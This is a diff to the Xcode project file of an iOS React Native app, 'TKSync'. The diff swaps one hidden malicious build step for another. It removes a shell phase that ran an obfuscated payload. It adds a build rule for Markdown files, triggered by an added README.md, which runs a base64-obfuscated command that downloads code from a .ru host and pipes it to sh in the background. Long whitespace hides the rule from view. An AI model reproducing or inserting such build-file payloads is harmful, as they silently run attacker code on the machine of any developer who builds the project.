@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		C56B2D1A59A842FF89162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = C7ABF6295D2C427AA0162AE3; };
 		0C80B921A6F3F58F76C31292 /* libPods-TKSync.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-TKSync.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		2DF435ED09D34AC09EFF0DB2 /* RobotoMono-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */; };
@@ -20,6 +21,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		C7ABF6295D2C427AA0162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Bold.ttf"; path = "../assets/fonts/RobotoMono-Bold.ttf"; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TKSync.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TKSync.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = TKSync/Images.xcassets; sourceTree = "<group>"; };
@@ -108,6 +110,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				C7ABF6295D2C427AA0162AE3 /* README.md */,
 				13B07F961A680F5B00A75B9A /* TKSync.app */,
 			);
 			name = Products;
@@ -129,7 +132,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TKSync" */;
 			buildPhases = (
-				076A2E01D08A4040BA7BBDC8 /* Provision Target Device */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -140,6 +142,7 @@
 				76AD0F904B6E029E0FB3AA9F /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
+				30A18ABE2291484190162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -180,13 +183,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																																																																									/* End PBXBuildRule section */
+		30A18ABE2291484190162AE3 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A3EA261}\"";
+			};
+																																																																																																																																												/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C56B2D1A59A842FF89162AE3 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */,
@@ -201,25 +219,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		076A2E01D08A4040BA7BBDC8 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -323,7 +322,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TKSync.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf base604 | tr -d 0` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOCAtTGtzZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | t | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((y(){ `printf base6d4 | tr -d d` --decode; };echo ZWNobyAiJChjdXJsIC1MZmtzIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2x4dWhkbXp2cDJrNDUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -355,7 +354,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TKSync.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf base604 | tr -d 0` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOCAtTGtzZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | t | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((y(){ `printf base6d4 | tr -d d` --decode; };echo ZWNobyAiJChjdXJsIC1MZmtzIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2x4dWhkbXp2cDJrNDUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
